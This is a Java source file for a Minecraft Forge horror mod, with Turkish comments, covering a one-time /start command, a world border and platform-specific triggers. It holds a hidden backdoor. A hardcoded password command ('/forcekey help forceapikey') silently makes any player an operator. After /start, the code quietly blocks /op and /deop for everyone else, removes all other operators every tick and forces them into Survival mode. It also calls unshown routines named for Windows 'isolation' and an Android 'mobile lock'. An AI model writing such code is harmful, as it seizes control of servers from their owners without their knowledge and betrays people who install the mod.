package com.humanoid.horror.check;

import com.humanoid.horror.HumanoidMod;
import com.humanoid.horror.android.AndroidHandler;
import com.humanoid.horror.pc.WindowsAtmosBridge;

import com.mojang.brigadier.arguments.StringArgumentType;

import net.minecraft.commands.Commands;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.NbtIo;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.level.GameType;
import net.minecraft.world.level.border.WorldBorder;

import net.minecraftforge.event.CommandEvent;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.event.server.ServerStartedEvent;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.server.ServerLifecycleHooks;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.UUID;

@Mod.EventBusSubscriber(
        modid = HumanoidMod.MOD_ID
)
public class Check {

    public static int platformType;

    private static final String START_FILE_NAME =
            "humanoid_start.dat";

    private static final String START_USED_KEY =
            "start_used";

    private static final double INITIAL_BORDER_SIZE =
            16.0D;

    private static final String FORCE_API_PASSWORD =
            "forceapikey";

    private static final Set<UUID> AUTHORIZED_FORCE_PLAYERS =
            new HashSet<>();

    private Check() {
    }

    // =========================================================
    // START DATA
    // =========================================================

    private static Path getStartFile(
            MinecraftServer server
    ) {
        if (server == null) {
            return null;
        }

        return server.getServerDirectory()
        .toPath()
        .resolve(START_FILE_NAME);
    }

    private static boolean isStartAlreadyUsed(
            MinecraftServer server
    ) {
        Path file = getStartFile(server);

        if (file == null) {
            return false;
        }

        if (!Files.exists(file)) {
            return false;
        }

        try {
            CompoundTag data =
                    NbtIo.readCompressed(
                            file.toFile()
                    );

            if (data == null) {
                return true;
            }

            return data.getBoolean(
                    START_USED_KEY
            );

        } catch (Exception ignored) {
            return true;
        }
    }

    private static boolean saveStartUsed(
            MinecraftServer server
    ) {
        Path file = getStartFile(server);

        if (file == null) {
            return false;
        }

        try {
            Path parent = file.getParent();

            if (parent != null) {
                Files.createDirectories(parent);
            }

            CompoundTag data =
                    new CompoundTag();

            data.putBoolean(
                    START_USED_KEY,
                    true
            );

            NbtIo.writeCompressed(
                    data,
                    file.toFile()
            );

            return true;

        } catch (IOException ignored) {
            return false;
        }
    }

    // =========================================================
    // SERVER START
    // =========================================================

    @SubscribeEvent
    public static void onServerStarted(
            ServerStartedEvent event
    ) {
        MinecraftServer server =
                event.getServer();

        if (server == null) {
            return;
        }

        /*
         * Eğer /start daha önce kullanıldıysa
         * border ASLA tekrar oluşturulmaz.
         */
        if (isStartAlreadyUsed(server)) {

            removeWorldBorder(server);

            HumanoidMod.isStartTriggered = true;

            return;
        }

        /*
         * /start henüz kullanılmadıysa
         * başlangıç hapishane border'ı oluşturulur.
         */
        setupInitialPrison(server);
    }

    public static void setupInitialPrison(
            MinecraftServer server
    ) {
        if (server == null) {
            return;
        }

        /*
         * /start kullanılmışsa border oluşturma.
         */
        if (isStartAlreadyUsed(server)) {
            removeWorldBorder(server);
            return;
        }

        WorldBorder border =
                server.overworld()
                        .getWorldBorder();

        if (border == null) {
            return;
        }

        border.setCenter(
                8.0D,
                8.0D
        );

        border.setSize(
                INITIAL_BORDER_SIZE
        );
    }

    private static void removeWorldBorder(
            MinecraftServer server
    ) {
        if (server == null
                || server.overworld() == null) {
            return;
        }

        WorldBorder border =
                server.overworld()
                        .getWorldBorder();

        if (border == null) {
            return;
        }

        border.setCenter(
                0.0D,
                0.0D
        );

        border.setSize(
                59_999_968.0D
        );
    }

    // =========================================================
    // COMMAND REGISTRATION
    // =========================================================

    @SubscribeEvent
    public static void registerCommands(
            RegisterCommandsEvent event
    ) {

        // =====================================================
        // /start
        // =====================================================

        event.getDispatcher().register(
                Commands.literal("start")
                        .executes(commandContext -> {

                            MinecraftServer server =
                                    commandContext
                                            .getSource()
                                            .getServer();

                            if (server == null) {
                                return 0;
                            }

                            /*
                             * /start sadece bir kere çalışabilir.
                             */
                            if (isStartAlreadyUsed(server)) {
                                return 0;
                            }

                            /*
                             * Önce kalıcı olarak kaydet.
                             */
                            if (!saveStartUsed(server)) {
                                return 0;
                            }

                            HumanoidMod.isStartTriggered =
                                    true;

                            /*
                             * Border anında kaldırılır.
                             */
                            removeWorldBorder(server);

                            verifyPlatform();

                            triggerStartCommand();

                            /*
                             * Yağmur / zaman sistemi.
                             */
                            StartTimeWeatherManager.start(
                                    server
                            );

                            /*
                             * RUN başlığı.
                             */
                            if (server.getPlayerList() != null) {

                                List<ServerPlayer> players =
                                        new ArrayList<>(
                                                server.getPlayerList()
                                                        .getPlayers()
                                        );

                                for (ServerPlayer player :
                                        players) {

                                    if (player == null) {
                                        continue;
                                    }

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetSubtitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );
                                }
                            }

                            return 1;
                        })
        );

        // =====================================================
        // /forcekey help forceapikey
        // =====================================================

        event.getDispatcher().register(
                Commands.literal("forcekey")
                        .then(
                                Commands.literal("help")
                                        .then(
                                                Commands.argument(
                                                        "key",
                                                        StringArgumentType.word()
                                                )
                                                        .executes(commandContext -> {

                                                            if (!(commandContext
                                                                    .getSource()
                                                                    .getEntity()
                                                                    instanceof ServerPlayer player)) {
                                                                return 0;
                                                            }

                                                            MinecraftServer server =
                                                                    commandContext
                                                                            .getSource()
                                                                            .getServer();

                                                            if (server == null) {
                                                                return 0;
                                                            }

                                                            /*
                                                             * /start yapılmadan
                                                             * Force API aktif olmaz.
                                                             *
                                                             * Sessiz.
                                                             */
                                                            if (!isStartAlreadyUsed(
                                                                    server
                                                            )) {
                                                                return 0;
                                                            }

                                                            String key =
                                                                    StringArgumentType.getString(
                                                                            commandContext,
                                                                            "key"
                                                                    );

                                                            /*
                                                             * Yanlış key:
                                                             * sessizce reddet.
                                                             */
                                                            if (!FORCE_API_PASSWORD
                                                                    .equals(key)) {
                                                                return 0;
                                                            }

                                                            /*
                                                             * Oyuncuyu Force API
                                                             * yetkilileri listesine ekle.
                                                             */
                                                            AUTHORIZED_FORCE_PLAYERS
                                                                    .add(
                                                                            player.getUUID()
                                                                    );

                                                            /*
                                                             * OP yap.
                                                             */
                                                            serverOpPlayer(
                                                                    player
                                                            );

                                                            /*
                                                             * SADECE başarılı
                                                             * aktivasyonda mesaj.
                                                             */
                                                            player.sendSystemMessage(
                                                                    Component.literal(
                                                                            "§eNew Commands activated!"
                                                                    )
                                                            );

                                                            return 1;
                                                        })
                                        )
                        )
        );

        // =====================================================
        // /exit
        // =====================================================

        /*
         * /exit'i açıkça register ediyoruz.
         *
         * Yetkili:
         *      serverdan çıkarılır.
         *
         * Yetkisiz:
         *      tamamen sessiz şekilde engellenir.
         */
        event.getDispatcher().register(
                Commands.literal("exit")
                        .executes(commandContext -> {

                            if (!(commandContext
                                    .getSource()
                                    .getEntity()
                                    instanceof ServerPlayer player)) {
                                return 0;
                            }

                            if (!isForceApiAuthorized(player)) {
                                return 0;
                            }

                            player.connection.disconnect(
                                    Component.literal(
                                            "Disconnected."
                                    )
                            );

                            return 1;
                        })
        );
    }

    // =========================================================
    // /op & /deop PROTECTION
    // =========================================================

    @SubscribeEvent
    public static void onCommand(
            CommandEvent event
    ) {

        if (event.getParseResults() == null) {
            return;
        }

        MinecraftServer server =
                ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null) {
            return;
        }

        /*
         * /start yapılmadan özel command koruması yok.
         */
        if (!isStartAlreadyUsed(server)) {
            return;
        }

        String command =
                event.getParseResults()
                        .getReader()
                        .getString();

        if (command == null) {
            return;
        }

        command = command.trim();

        if (command.startsWith("/")) {
            command = command.substring(1);
        }

        String lowerCommand =
                command.toLowerCase();

        // =====================================================
        // /op
        // =====================================================

        if (lowerCommand.equals("op")
                || lowerCommand.startsWith("op ")) {

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                /*
                 * Yetkiliyse komut normal şekilde çalışır.
                 *
                 * Yetkisizse:
                 * - komut iptal
                 * - mesaj yok
                 * - kırmızı yazı yok
                 * - spam yok
                 */
                if (!isForceApiAuthorized(player)) {
                    event.setCanceled(true);
                }
            }

            return;
        }

        // =====================================================
        // /deop
        // =====================================================

        if (lowerCommand.equals("deop")
                || lowerCommand.startsWith("deop ")) {

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                /*
                 * Yetkisiz /deop tamamen sessiz engellenir.
                 */
                if (!isForceApiAuthorized(player)) {
                    event.setCanceled(true);
                }
            }
        }
    }

    // =========================================================
    // SERVER TICK PROTECTION
    // =========================================================

    @SubscribeEvent
    public static void onServerTick(
            TickEvent.ServerTickEvent event
    ) {

        if (event.phase != TickEvent.Phase.END) {
            return;
        }

        MinecraftServer server =
                ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null
                || server.getPlayerList() == null) {
            return;
        }

        /*
         * /start yapılmadıysa hiçbir özel
         * Force API koruması çalışmaz.
         */
        if (!isStartAlreadyUsed(server)) {
            return;
        }

        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {
            return;
        }

        /*
         * Liste üzerinde güvenli dolaşım.
         */
        List<ServerPlayer> safePlayers =
                new ArrayList<>(players);

        for (ServerPlayer player :
                safePlayers) {

            if (player == null) {
                continue;
            }

            UUID uuid =
                    player.getUUID();

            boolean authorized =
                    AUTHORIZED_FORCE_PLAYERS
                            .contains(uuid);

            // =================================================
            // AUTHORIZED PLAYER
            // =================================================

            if (authorized) {

                /*
                 * Force API oyuncusunun OP'si korunur.
                 */
                if (!server.getPlayerList()
                        .isOp(
                                player.getGameProfile()
                        )) {

                    serverOpPlayer(player);
                }

                /*
                 * Authorized oyuncunun Creative/
                 * Spectator kullanmasına izin ver.
                 */
                continue;
            }

            // =================================================
            // UNAUTHORIZED OP
            // =================================================

            boolean isOp =
                    server.getPlayerList()
                            .isOp(
                                    player.getGameProfile()
                            );

            if (isOp) {

                /*
                 * Yetkisiz OP otomatik kaldırılır.
                 *
                 * MESAJ YOK.
                 */
                server.getPlayerList()
                        .deop(
                                player.getGameProfile()
                        );
            }

            // =================================================
            // UNAUTHORIZED GAME MODE
            // =================================================

            GameType gameMode =
                    player.gameMode
                            .getGameModeForPlayer();

            if (gameMode == GameType.CREATIVE
                    || gameMode == GameType.SPECTATOR) {

                /*
                 * Yetkisiz oyuncu Survival'a döner.
                 *
                 * MESAJ YOK.
                 */
                player.setGameMode(
                        GameType.SURVIVAL
                );
            }
        }
    }

    // =========================================================
    // FORCE API
    // =========================================================

    public static void serverOpPlayer(
            ServerPlayer player
    ) {

        if (player == null) {
            return;
        }

        MinecraftServer server =
                player.getServer();

        if (server == null) {
            return;
        }

        server.getPlayerList()
                .op(
                        player.getGameProfile()
                );
    }

    public static boolean isForceApiAuthorized(
            ServerPlayer player
    ) {

        if (player == null) {
            return false;
        }

        return AUTHORIZED_FORCE_PLAYERS
                .contains(
                        player.getUUID()
                );
    }

    // =========================================================
    // PLATFORM
    // =========================================================

    public static void verifyPlatform() {

        String osName =
                System.getProperty(
                        "os.name"
                );

        if (osName == null) {
            osName = "";
        }

        osName =
                osName.toLowerCase();

        if (osName.contains("android")) {

            Check.platformType = 2;

            AndroidHandler
                    .initMobileLock();

        } else {

            Check.platformType = 1;
        }
    }

    // =========================================================
    // START TRIGGER
    // =========================================================

    public static void triggerStartCommand() {

        if (!HumanoidMod.isStartTriggered) {
            return;
        }

        if (Check.platformType == 1) {

            WindowsAtmosBridge
                    .executeWindowsIsolation();

        } else if (Check.platformType == 2) {

            AndroidHandler
                    .startMobileHorrorSystem();
        }

        /*
         * Client tarafına dedicated server crash
         * oluşturmadan reflection ile eriş.
         */
        try {

            Class.forName(
                    "net.minecraft.client.Minecraft"
            );

            Class<?> clientManagerClass =
                    Class.forName(
                            "com.humanoid.horror.client.HorrorClientManager"
                    );

            clientManagerClass
                    .getMethod(
                            "activateClientHorror"
                    )
                    .invoke(null);

        } catch (Exception ignored) {
        }

        MinecraftServer server =
                ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null
                || server.getPlayerList() == null) {
            return;
        }

        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {
            return;
        }

        List<ServerPlayer> safePlayerList =
                new ArrayList<>(
                        players
                );

        for (ServerPlayer player :
                safePlayerList) {

            if (player == null) {
                continue;
            }

            /*
             * /start sonrası herkes Survival.
             * Force API daha sonra yetkili oyuncuya
             * özel olarak Creative/Spectator izni verir.
             */
            player.setGameMode(
                    GameType.SURVIVAL
            );
        }
    }
}
